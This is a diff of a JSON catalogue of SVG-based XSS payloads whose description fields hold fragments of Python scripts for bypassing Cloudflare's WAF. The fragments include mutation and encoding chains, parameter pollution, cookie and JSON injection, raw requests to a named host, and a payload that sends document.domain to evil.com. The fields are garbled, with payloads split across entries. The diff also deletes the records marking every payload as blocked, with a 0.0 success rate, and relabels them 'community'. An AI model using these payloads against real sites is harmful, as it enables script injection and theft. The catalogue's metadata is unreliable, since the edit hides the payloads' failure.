@@ -1,7 +1,7 @@
 {
   "category": "xss",
   "subcategory": "svg_based",
-  "count": 144,
+  "count": 129,
   "payloads": [
     {
       "id": "xss-0003",
@@ -11,11 +11,7 @@
       "description": "svg-id-text\": '<svg id=x>test</svg>',\n    \"img-src-only\": '<img src=x>',\n    \"img-alt\": '<img src=x alt=test>',\n    \"input-type-text\": '<input type=text value=x>',\n    \"input-type-image\": '<input type=image src=x>',\n    \"a-href-hash\": '<a href=\"#\">test</a>',\n    \"a-href-data\": '<a href=\"data:,\">test</a>',\n\n    # Try to inject event handlers character by character\n    \"svg-on\": '<svg on=>',\n    \"svg-onl\": '<svg onl=>',\n    \"svg-onlo\": '<svg onlo=>',\n    \"svg-onloa\": '<svg onloa=>',\n    \"svg-onload-eq\": '<svg onload=>',\n    \"svg-onload-1\": '<svg onload=1>',\n    \"svg-onload-x\": '<svg onload=x>',\n    \"svg-onload-void\": '<svg onload=void(0)>',\n\n    # Try event on div (less suspicious)\n    \"div-on\": '<div on=>',\n    \"div-onclick-1\": '<div onclick=1>',\n    \"div-onclick-x\": '<div onclick=x>',\n    \"div-onclick-void\": '<div onclick=void(0)>',\n    \"div-onclick-this\": '<div onclick=this>',\n    \"div-onclick-self\": '<div onclick=self>',\n\n    # Progressive escalation\n    \"img-src-err\": '<img src=x:x>',\n    \"img-src-err-on\": '<img src=x:x on>',\n    \"img-src-err-onerr\": '<img src=x:x onerr>',\n    \"img-src-err-onerror\": '<img src=x:x onerror>',\n    \"img-src-err-onerror-eq\": '<img src=x:x onerror=>',\n    \"img-src-err-onerror-1\": '<img src=x:x onerror=1>',\n    \"img-src-err-onerror-x\": '<img src=x:x onerror=x>',\n}\n\nfor name, payload in combos.items():\n    test(name, \"globalHtml\", payload)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"6C: WAF Size Limit Testing",
       "technique": "direct_injection",
       "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0004",
@@ -25,25 +21,7 @@
       "description": "safe",
       "technique": "direct_injection",
       "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0005",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg ",
-      "description": "onlo', 'ad=', 'alert', '(1)>",
-      "technique": "direct_injection",
-      "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0007",
@@ -53,11 +31,7 @@
       "description": "\"><svg/oni=on onload=confirm(2)>",
       "technique": "direct_injection",
       "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0008",
@@ -67,25 +41,7 @@
       "description": "safe",
       "technique": "direct_injection",
       "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0009",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg",
-      "description": "\" onload=alert(1) x=\"",
-      "technique": "direct_injection",
-      "source_file": "waf_round6.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0011",
@@ -95,11 +51,7 @@
       "description": "noscript', 'style', 'script', 'iframe',\n    'xmp', 'textarea', 'noframes', 'title',\n]\n\nINNER_PAYLOADS = [\n    '<img src onerror=alert(1)>',\n    '<img src onerror=confirm(1)>',\n    '<img src onerror=prompt(1)>',\n    '<svg onload=alert(1)>',\n    '<img src=x onerror=(alert)(1)>',\n    '<img src=x onerror=window.alert?.(1)>',\n]\n\nfor tag in CONSUMING_TAGS:\n    for inner in INNER_PAYLOADS:\n        # Standard consuming tag pattern\n        p = f'<{tag}><img title=\"</{tag}>{inner}\"></{tag}>'\n        get(p, label=f\"consume-{tag}",
       "technique": "direct_injection",
       "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0017",
@@ -109,11 +61,7 @@
       "description": "<img xss=alert(1) src=x onerror=eval(this.getAttribute(\"xss",
       "technique": "direct_injection",
       "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0025",
@@ -123,11 +71,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<input onfocus=alert(1) autofocus>',\n    '<details open ontoggle=alert(1)>',\n    '<body onload=alert(1)>',\n    '<script>alert(1)</script>',\n    '<a href=\"javascript:alert(1)\">click</a>',\n    '<iframe src=\"javascript:alert(1)\">',\n    '<marquee onstart=alert(1)>',\n    '<video src=x onerror=alert(1)>',\n]\n\ndef mutate(payload):\n    \"\"\"Generate many mutations of a payload.\"\"\"\n    variants = set()\n    variants.add(payload)\n    \n    # Case mutations\n    variants.add(payload.upper())\n    variants.add(payload.lower())\n    variants.add(payload.swapcase())\n    # Random mixed case\n    for _ in range(3):\n        v = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)\n        variants.add(v)\n    \n    # Whitespace mutations\n    for ws in ['\\t', '\\n', '\\r', '\\x0c', '\\x0b",
       "technique": "obfuscation",
       "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0030",
@@ -137,11 +81,7 @@
       "description": "ignored=() src=x', 1))\n    \n    # Add fake attribute before real event (s0md3v bypass)\n    if 'onload=' in payload.lower():\n        variants.add(payload.replace('onload=', 'onx=() onload=",
       "technique": "direct_injection",
       "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0034",
@@ -151,11 +91,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<input onfocus=alert(1) autofocus>',\n    '<details open ontoggle=alert(1)>',\n]\n\nfor p in CHAIN_BASES:\n    # Triple URL encode\n    triple = urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(p)))\n    get(triple)\n    post(triple)\n    \n    # URL encode → HTML entity\n    url_first = urllib.parse.quote(p)\n    html_ent = ''.join(f'&#{ord(c)};' for c in url_first)\n    get(html_ent)\n    post(html_ent)\n    \n    # HTML entity → URL encode\n    html_first = ''.join(f'&#{ord(c)};' for c in p)\n    url_second = urllib.parse.quote(html_first)\n    get(url_second)\n    post(url_second)\n    \n    # Hex entity\n    hex_ent = ''.join(f'&#x{ord(c):x};' for c in p)\n    get(hex_ent)\n    post(hex_ent)\n    \n    # Unicode escape\n    uni_esc = ''.join(f'\\\\u{ord(c):04x}' for c in p)\n    get(uni_esc)\n    post(uni_esc)\n\nprint(f\"  Encoding chains done: {total} total",
       "technique": "encoding",
       "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0035",
@@ -165,11 +101,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<svg onx=() onload=window.alert?.()>',\n    '<img hrEF=\"x\" sRC=\"data:x,\" oNLy=1 oNErrOR=prompt`1`>',\n    '<img src=OnErRor OnErRor=(alert)(1)>',\n    '<Img/Src/OnError=(alert)(1)>',\n    '<svg/on%20onload=alert(1)>',\n    '\"><sVg/OnLuFy=\"X=y\"oNloaD=;1^confirm(1)>/``^1//',\n]\n\nfor method in METHODS:\n    for p in METHOD_PAYLOADS:\n        enc = urllib.parse.quote(p, safe='",
       "technique": "direct_injection",
       "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0036",
@@ -179,11 +111,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<Img/Src/OnError=(alert)(1)>',\n    '<img src=OnErRor OnErRor=(alert)(1)>',\n]\n\nfor p in COOKIE_PAYLOADS:\n    raw_req(\n        f\"GET / HTTP/1.1\\r\\nHost: {HOST}\\r\\n\"\n        f\"Cookie: session={urllib.parse.quote(p)}\\r\\n\"\n        f\"Connection: close\\r\\n\\r\\n\".encode())\n    raw_req(\n        f\"GET / HTTP/1.1\\r\\nHost: {HOST}\\r\\n\"\n        f\"Cookie: globalHtml={urllib.parse.quote(p)}\\r\\n\"\n        f\"Connection: close\\r\\n\\r\\n\".encode())\n\nprint(f\"  Cookie injection done: {total} total",
       "technique": "encoding",
       "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0037",
@@ -193,11 +121,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<Img/Src/OnError=(alert)(1)>',\n    '<svg onx=() onload=window.alert?.()>',\n    '<img hrEF=\"x\" sRC=\"data:x,\" oNLy=1 oNErrOR=prompt`1`>',\n    '<img src=OnErRor OnErRor=(alert)(1)>',\n    '\"><sVg/OnLuFy=\"X=y\"oNloaD=;1^confirm(1)>/``^1//',\n]\n\nfor p in JSON_PAYLOADS:\n    # Standard JSON\n    body = json.dumps({\"globalHtml\": p}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/json\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n    \n    # JSON with unicode escapes\n    esc = ''.join(f'\\\\u{ord(c):04x}' for c in p)\n    body2 = f'{{\"globalHtml\":\"{esc}\"}}'.encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/json\\r\\n\"\n        b\"Content-Length: \" + str(len(body2)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body2)\n    \n    # Nested JSON\n    body3 = json.dumps({\"data\": {\"globalHtml\": p}}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/json\\r\\n\"\n        b\"Content-Length: \" + str(len(body3)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body3)\n    \n    # Array JSON\n    body4 = json.dumps({\"globalHtml\": [p]}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/json\\r\\n\"\n        b\"Content-Length: \" + str(len(body4)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body4)\n\nprint(f\"  JSON variations done: {total} total",
       "technique": "encoding",
       "source_file": "waf_round72_oss2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0038",
@@ -207,11 +131,7 @@
       "description": "_",
       "technique": "direct_injection",
       "source_file": "waf_round22_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0039",
@@ -221,11 +141,7 @@
       "description": "P",
       "technique": "direct_injection",
       "source_file": "waf_round22_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0040",
@@ -235,11 +151,7 @@
       "description": "dbl-on\": b\"/?globalHtml=%3Csvg%20%256f%256eload%3Dalert(1)%3E\",\n    # Triple encode\n    \"triple-full\": b\"/?globalHtml=%25253Csvg%252520onload%25253Dalert(1)%25253E\",\n    # Mixed: some chars single, some double encoded\n    \"mixed-enc\": b\"/?globalHtml=%3Csvg%20%6f%6e%6c%6f%61%64%3Dalert(1)%3E\",\n    \"mixed-enc2\": b\"/?globalHtml=<svg%2520onload%253Dalert(1)>\",\n}\n\nfor name, path in double_enc_payloads.items():\n    raw_request(name,\n        b\"GET \" + path + b\" HTTP/1.1\\r\\n\"\n        b\"Host: waf.cumulusfire.net\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n",
       "technique": "encoding",
       "source_file": "waf_round22_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0041",
@@ -249,11 +161,7 @@
       "description": "hpp-3param\": \"?globalHtml=%3Csvg&globalHtml=%20onload%3D&globalHtml=alert(1)%3E\",\n    \"hpp-first-safe\": \"?globalHtml=safe&globalHtml=%3Csvg/onload%3Dalert(1)%3E\",\n    \"hpp-last-safe\": \"?globalHtml=%3Csvg/onload%3Dalert(1)%3E&globalHtml=safe\",\n    # Mix globalHtml and attributeHtml\n    \"hpp-mixed\": \"?globalHtml=%3Csvg&attributeHtml=%22%20onload%3Dalert(1)%20x%3D%22\",\n    # Semicolon separator (some servers treat ; as &)\n    \"hpp-semi\": \"?globalHtml=%3Csvg;globalHtml=onload%3Dalert(1)%3E\",\n    # Array notation\n    \"hpp-array\": \"?globalHtml[]=%3Csvg/onload%3Dalert(1)%3E\",\n    \"hpp-array0\": \"?globalHtml[0]=%3Csvg/onload%3Dalert(1)%3E\",\n}\n\nfor name, qs in hpp.items():\n    raw_request(name,\n        b\"GET \" + qs.encode() + b\" HTTP/1.1\\r\\n\"\n        b\"Host: waf.cumulusfire.net\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n",
       "technique": "encoding",
       "source_file": "waf_round22_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0055",
@@ -263,11 +171,7 @@
       "description": "<svg onx=() onload=(confirm)(1)>',\n    '<svg onx=() onload=window.alert?.()>',\n    '<img ignored=() src=x onerror=prompt(1)>',\n    '<svg on =i onload=alert(domain)>',\n    '<svg/on%20onload=alert(1)>',\n    '<svg/onload=location=\"https://evil.com/\"+document.domain>',\n    '1\\'\"><img/src/onerror=.1|alert``>',\n    '<a\"/onclick=(confirm)()>Click Here!</a>',\n    '<img src=x onError=import(\"//1152848220/",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0064",
@@ -277,11 +181,7 @@
       "description": "alert(1)', '>",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0069",
@@ -291,11 +191,7 @@
       "description": "<img src=x onerror={func}{open}1{close}>',\n    '\"><svg onload={func}{open}\"1\"{close}>',\n    '<svg onload={func}{open}document.domain{close}>',\n]\n\nfor open_e, close_e in ENTITY_VARIANTS:\n    for func in ENTITY_FUNCS:\n        for tmpl in ENTITY_TAGS:\n            p = tmpl.replace('{func}', func).replace('{open}', open_e).replace('{close}', close_e)\n            get(p, label=\"entity-deep",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0070",
@@ -305,11 +201,7 @@
       "description": "<img src=x onerror={func}(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0071",
@@ -319,11 +211,7 @@
       "description": "java\\tscript:alert(1)',\n    'java\\nscript:alert(1)',\n    'java\\rscript:alert(1)',\n    'j\\ta\\tv\\ta\\ts\\tc\\tr\\ti\\tp\\tt:alert(1)',\n    'j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;alert(1)',\n    'j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t:alert(1)',\n    'j&#x9;a&#x9;v&#x9;a&#x9;s&#x9;c&#x9;r&#x9;i&#x9;p&#x9;t:alert(1)',\n    'j&#10;avascript:alert(1)',\n    'j&#13;avascript:alert(1)',\n    'javascript&#58;alert(1)',\n    'javascript&colon;alert(1)',\n    'java%0ascript:alert(1)',\n    'java%0dscript:alert(1)',\n    'java%09script:alert(1)',\n    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)',\n    '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)',\n    'javascript:{alert`0`}',\n    'javascript:void(alert(1))',\n    'javascript:/**/alert(1)',\n]\n\nfor uri in JS_URI_VARIANTS:\n    # In href\n    p = f'<a href=\"{uri}\">click</a>'\n    get(p, label=\"jsuri-href",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0072",
@@ -333,11 +221,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<details open ontoggle=alert(1)>',\n    '<input onfocus=alert(1) autofocus>',\n    '<body onload=alert(1)>',\n]\n\n# GenXSS-inspired mutations\nGENXSS_MUTS = [\n    # Unicode escape the function\n    lambda p: p.replace('alert', '\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074",
       "technique": "encoding",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0093",
@@ -347,11 +231,7 @@
       "description": "<svg onx=() onload=window.alert?.()>',\n    '<img oNLy=1 src=x oNErrOR=prompt`1`//>',\n    '<img//////src=x oNlY=1 oNerror=alert(\"xss",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0099",
@@ -361,11 +241,7 @@
       "description": "\" on{x=1 onfocus=alert(1) autofocus x=\"',\n    '\" on}x=1 onfocus=alert(1) autofocus x=\"',\n    # Many gap attrs to \"exhaust\" WAF regex\n    '\" ' + ' '.join([f'on`{chr(97+i)}=1' for i in range(26)]) + ' onfocus=alert(1) autofocus x=\"',\n    '\" ' + ' '.join([f'on{{{chr(97+i)}=1' for i in range(26)]) + ' onfocus=alert(1) autofocus x=\"',\n    # Gap with very long value then real event\n    f'\" on`x={\"A\"*1000} onfocus=alert(1) autofocus x=\"',\n    f'\" on{{x={\"A\"*1000} onfocus=alert(1) autofocus x=\"',\n    # Multiple gap patterns then real event via different params\n    # (globalHtml has gap, attributeHtml has real event)\n]\n\nfor i, payload in enumerate(combos):\n    # Via GET\n    try:\n        r = requests.get(BASE, params={\"attributeHtml\": payload},\n                        verify=False, timeout=TIMEOUT)\n        blocked = r.status_code in (403, 406, 503)\n        reflected = check_xss(r.text) if not blocked else False\n        report(f\"GET-combo-{i}\", r.status_code, blocked, reflected, \"combo-get",
       "technique": "direct_injection",
       "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0101",
@@ -375,11 +251,7 @@
       "description": "<svg><animate onend=alert(1) attributeName=x dur=1s>',\n    '<svg><set onbegin=alert(1) attributeName=x>', '<svg><set onend=alert(1)>',\n    '<svg><animateTransform onbegin=alert(1)>', '<svg><animateMotion onbegin=alert(1)>',\n    '<svg><use href=\"data:image/svg+xml,<svg onload=alert(1)>\">', '<svg><use xlink:href=\"data:image/svg+xml,<svg onload=alert(1)>\">',\n    '<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>',\n    '<svg><foreignObject><iframe src=\"javascript:alert(1)\"></foreignObject></svg>',\n    '<svg><a href=\"javascript:alert(1)\"><text>click</text></a></svg>',\n    '<svg><a xlink:href=\"javascript:alert(1)\"><text>click</text></a></svg>',\n    '<svg><script>alert(1)</script></svg>', '<svg><script href=\"data:,alert(1)\"></script></svg>',\n    '<svg><image href=\"x\" onerror=alert(1)>', '<svg><image xlink:href=\"x\" onerror=alert(1)>',\n    '<svg><rect width=100 height=100 onmouseover=alert(1)>',\n    '<svg><circle r=50 onclick=alert(1)>', '<svg><ellipse rx=50 ry=25 onclick=alert(1)>',\n    '<svg><line x1=0 y1=0 x2=100 y2=100 onclick=alert(1)>',\n    '<svg><polyline points=\"0,0 100,100\" onclick=alert(1)>',\n    '<svg><polygon points=\"0,0 100,0 50,100\" onclick=alert(1)>',\n    '<svg><path d=\"M0 0\" onclick=alert(1)>',\n    '<svg><text onclick=alert(1)>click</text></svg>',\n    '<svg><tspan onclick=alert(1)>click</tspan>',\n    '<svg><desc><img src=x onerror=alert(1)></desc></svg>',\n    '<svg><title><img src=x onerror=alert(1)></title></svg>',\n    '<svg onload=alert(1) xmlns=\"http://www.w3.org/2000/svg\">',\n    '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">',\n    '<svg><handler type=\"application/ecmascript\">alert(1)</handler></svg>',\n]\n\nfor p in svg_payloads:\n    enc = urllib.parse.quote(p)\n    get(f\"globalHtml={enc}",
       "technique": "direct_injection",
       "source_file": "waf_round70_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0104",
@@ -389,11 +261,7 @@
       "description": "<svg/onload=top[\"al\"+\"ert",
       "technique": "direct_injection",
       "source_file": "waf_round70_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0120",
@@ -403,11 +271,7 @@
       "description": "'><svg/onload=alert(1)>\",\n    '\"><img src=x onerror=alert(1)>',\n    '\"><script>alert(1)</script>',\n    '\"><details open ontoggle=alert(1)>',\n    f'\"><svg/onload=eval(atob(\"YWxlcnQoMSk=",
       "technique": "direct_injection",
       "source_file": "waf_round80_last.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0133",
@@ -417,11 +281,7 @@
       "description": "svg-fo-benign\": '<svg><foreignObject><b>bold</b></foreignObject></svg>',\n    # Math wrapping SVG foreignObject\n    \"math-svg-fo\": '<math><annotation-xml encoding=\"image/svg+xml\"><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></annotation-xml></math>',\n    # Self-close + foreignObject\n    \"sc-fo\": {\"attributeHtml\": '\"/><foreignObject><img src=x onerror=alert(1)>'},\n    \"sc-fo-benign\": {\"attributeHtml\": '\"/><foreignObject><b>bold</b>'},\n    # MathML mfenced as container\n    \"mfenced-fo\": '<math><mfenced><foreignObject><b>bold</b></foreignObject></mfenced></math>',\n}\n\nfor name, payload in foreign.items():\n    if isinstance(payload, dict):\n        t(name, payload)\n    else:\n        t(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"24E: Template Tag Injection (Shadow DOM)",
       "technique": "direct_injection",
       "source_file": "waf_round24_mathml.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0163",
@@ -431,11 +291,7 @@
       "description": "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">',\n    \n    # URL-encoded SVG\n    '<img src=\"data:image/svg+xml,%3Csvg onload=alert(1)%3E\">',\n    \n    # SVG with script in data URI\n    '<img src=\"data:image/svg+xml,<svg><script>alert(1)</script></svg>\">',\n    \n    # Object tag with SVG\n    '<object data=\"data:image/svg+xml,<svg onload=alert(1)>\">',\n    '<object type=\"image/svg+xml\" data=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">',\n    \n    # Embed tag with SVG\n    '<embed src=\"data:image/svg+xml,<svg onload=alert(1)>\">',\n]\n\nfor payload in svg_data_uri:\n    if test_payload(payload, label=f\"SVG Data URI: {payload[:50]}",
       "technique": "encoding",
       "source_file": "waf_image_xss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0164",
@@ -445,11 +301,7 @@
       "description": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>',\n    '<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>',\n]\n\nfor payload in svg_upload_payloads:\n    if test_payload(payload, method=\"POST\", content_type=\"multipart/form-data\", label=f\"SVG Upload: {payload[:50]}",
       "technique": "direct_injection",
       "source_file": "waf_image_xss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0165",
@@ -459,11 +311,7 @@
       "description": "<svg><script><![CDATA[alert(document.domain)]]></script></svg>',\n    '<svg><script>//<![CDATA[\\nalert(1)\\n//]]></script></svg>',\n]\n\nfor payload in cdata_payloads:\n    if test_payload(payload, label=f\"SVG CDATA: {payload[:50]}",
       "technique": "direct_injection",
       "source_file": "waf_image_xss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0166",
@@ -473,11 +321,7 @@
       "description": "<math><annotation-xml encoding=\"text/html\"><svg onload=\"alert(1)\"></annotation-xml></math>',\n]\n\nfor payload in mathml_payloads:\n    if test_payload(payload, label=f\"MathML+SVG: {payload[:50]}",
       "technique": "direct_injection",
       "source_file": "waf_image_xss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0167",
@@ -487,11 +331,7 @@
       "description": "<SVG ONLOAD=ALERT(1)>',\n    \n    # Whitespace/newline\n    '<svg\\nonload=alert(1)>',\n    '<svg\\tonload=alert(1)>',\n    '<svg\\r\\nonload=alert(1)>',\n    \n    # Null bytes (may be filtered)\n    '<svg\\x00onload=alert(1)>',\n    \n    # Comment injection\n    '<svg<!--comment-->onload=alert(1)>',\n    \n    # Multiple slashes\n    '<svg///////onload=alert(1)>',\n]\n\nfor payload in obfuscated_svg:\n    if test_payload(payload, label=f\"SVG Obfusc: {payload[:50]}",
       "technique": "obfuscation",
       "source_file": "waf_image_xss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0168",
@@ -501,11 +341,7 @@
       "description": "test<svg onload=alert(1)>.svg',\n    '\"><img src=x onerror=alert(1)>.jpg',\n]\n\nfor payload in filename_payloads:\n    # Simulate file upload with XSS in filename\n    boundary = \"----WebKitFormBoundary\"\n    body = (\n        f\"------WebKitFormBoundary\\r\\n\"\n        f'Content-Disposition: form-data; name=\"file\"; filename=\"{payload}\"\\r\\n'\n        f\"Content-Type: image/svg+xml\\r\\n\\r\\n\"\n        f\"<svg></svg>\\r\\n\"\n        f\"------WebKitFormBoundary--\\r\\n",
       "technique": "direct_injection",
       "source_file": "waf_image_xss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0175",
@@ -515,11 +351,7 @@
       "description": "hexaphp-body\": '<body OnLoAd OnLoAd=(alert)(\"test",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0177",
@@ -529,11 +361,7 @@
       "description": "frizb-fullwidth-img\": '\\uff1cimg src=x onerror=alert(1)\\uff1e',\n    # Unicode homoglyphs for script\n    \"frizb-homoglyph\": '<\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>alert(1)</script>',\n    # Combining characters\n    \"frizb-combining\": '<scr\\u0300ipt>alert(1)</script>',\n    # Whitespace variants\n    \"frizb-ws-tag\": '<script\\t\\n\\r>alert(1)</script>',\n    # Double URL encoding\n    \"frizb-double-url\": '%253Cscript%253Ealert(1)%253C%252Fscript%253E',\n    # Triple URL encoding\n    \"frizb-triple-url\": '%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E',\n}\n\nfor name, payload in frizb.items():\n    test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"19F: Combined Best Techniques via Attribute Breakout",
